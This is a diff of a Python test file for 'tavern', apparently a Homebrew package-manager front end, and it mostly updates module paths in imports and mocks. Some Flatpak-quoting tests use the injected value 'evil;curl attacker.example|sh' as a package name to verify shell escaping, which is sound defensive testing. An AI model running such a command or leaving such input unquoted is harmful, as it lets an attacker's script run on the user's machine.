@@ -286,14 +286,14 @@ class TestBrewfileParsing:
 
 class TestBrewCmd:
     def test_non_flatpak_uses_brew_directly(self, monkeypatch):
-        import tavern.backend as bmod
+        import tavern.brew_env as bmod
         monkeypatch.setattr(bmod, 'IN_FLATPAK', False)
         monkeypatch.setattr(bmod, 'BREW_BIN', '/usr/local/bin/brew')
         cmd = _brew_cmd(['install', 'git'])
         assert cmd == ['/usr/local/bin/brew', 'install', 'git']
 
     def test_flatpak_uses_flatpak_spawn(self, monkeypatch):
-        import tavern.backend as bmod
+        import tavern.brew_env as bmod
         monkeypatch.setattr(bmod, 'IN_FLATPAK', True)
         cmd = _brew_cmd(['install', 'git'])
         assert cmd[0] == 'flatpak-spawn'
@@ -305,7 +305,7 @@ class TestBrewCmd:
         # untrusted input (tap .rb filenames, Brewfile contents, GitHub tap
         # search). An unquoted ``evil;curl host|sh`` would run on the HOST
         # via flatpak-spawn --host; it must be single-quoted instead.
-        import tavern.backend as bmod
+        import tavern.brew_env as bmod
         monkeypatch.setattr(bmod, 'IN_FLATPAK', True)
         cmd = _brew_cmd(['install', 'evil;curl attacker.example|sh'])
         joined = ' '.join(cmd)
@@ -319,7 +319,7 @@ class TestBrewCmd:
     def test_non_flatpak_still_list_exec(self, monkeypatch):
         # The non-Flatpak path is a plain argv list — no shell involved, so
         # no quoting needed; metacharacters stay inert.
-        import tavern.backend as bmod
+        import tavern.brew_env as bmod
         monkeypatch.setattr(bmod, 'IN_FLATPAK', False)
         monkeypatch.setattr(bmod, 'BREW_BIN', '/usr/local/bin/brew')
         cmd = _brew_cmd(['install', 'evil;curl attacker.example|sh'])
@@ -589,7 +589,7 @@ class TestBrewBackendExtensions:
             stderr = ""
         
         monkeypatch.setattr("subprocess.run", lambda cmd, **kwargs: MockCompletedProcess())
-        monkeypatch.setattr("tavern.taps._brew_cmd", lambda args: ["brew"] + args)
+        monkeypatch.setattr("tavern.backend_transport._brew_cmd", lambda args: ["brew"] + args)
         
         callback_args = []
         def cb(success, message):
@@ -793,7 +793,7 @@ class TestBrewBackendExtensions:
             return _Result(cmd)
 
         monkeypatch.setattr('subprocess.run', fake_run)
-        monkeypatch.setattr('tavern.backend_state._brew_cmd', lambda args: ['brew'] + args)
+        monkeypatch.setattr('tavern.backend_transport._brew_cmd', lambda args: ['brew'] + args)
 
         from tavern.backend import Package
         pkg = Package({'name': 'ripgrep', 'desc': 'x', 'homepage': '',
@@ -854,7 +854,7 @@ class TestBrewBackendExtensions:
             stdout = 'ripgrep\n'
             stderr = ''
         monkeypatch.setattr('subprocess.run', lambda *a, **kw: _R())
-        monkeypatch.setattr('tavern.backend_state._brew_cmd', lambda args: ['brew'] + args)
+        monkeypatch.setattr('tavern.backend_transport._brew_cmd', lambda args: ['brew'] + args)
 
         # Synchronous idle_add so we can assert directly afterward.
         monkeypatch.setattr(GLib, 'idle_add',
@@ -915,7 +915,7 @@ class TestBrewBackendExtensions:
                 return MockResponse(json.dumps([{'token': 'firefox', 'name': ['Firefox'], 'version': '1.0.0'}]).encode('utf-8'))
             return MockResponse(b'[]')
         
-        monkeypatch.setattr('tavern.backend_remote.urlopen', mock_urlopen)
+        monkeypatch.setattr('tavern.backend_transport.urlopen', mock_urlopen)
 
         # Mock subprocess run for brew list and brew tap commands
         def mock_run(cmd, **kwargs):
@@ -995,7 +995,7 @@ class TestBrewBackendExtensions:
                 pass
             def read(self, *args, **kwargs):
                 return self._data
-        monkeypatch.setattr('tavern.media.urlopen', lambda req, timeout=None: MockResponse())
+        monkeypatch.setattr('tavern.backend_transport.media_urlopen', lambda req, timeout=None: MockResponse())
 
         backend = BrewBackend()
         backend._icon_executor = SynchronousExecutor()
@@ -1100,7 +1100,7 @@ class TestBrewBackendExtensions:
                 pass
             def read(self, *args, **kwargs):
                 return self._data
-        monkeypatch.setattr('tavern.media.urlopen', lambda req, timeout=None: MockResponse())
+        monkeypatch.setattr('tavern.backend_transport.media_urlopen', lambda req, timeout=None: MockResponse())
 
         backend = BrewBackend()
         pkg = Package({'name': 'ripgrep', 'homepage': 'https://github.com/BurntSushi/ripgrep'}, 'formula')
@@ -1139,7 +1139,7 @@ class TestBrewBackendExtensions:
                 pass
             def read(self, *args, **kwargs):
                 return self._data
-        monkeypatch.setattr('tavern.media.urlopen', lambda req, timeout=None: MockResponse())
+        monkeypatch.setattr('tavern.backend_transport.media_urlopen', lambda req, timeout=None: MockResponse())
 
         backend = BrewBackend()
         pkg = Package({'name': 'ripgrep', 'homepage': 'https://github.com/BurntSushi/ripgrep'}, 'formula')
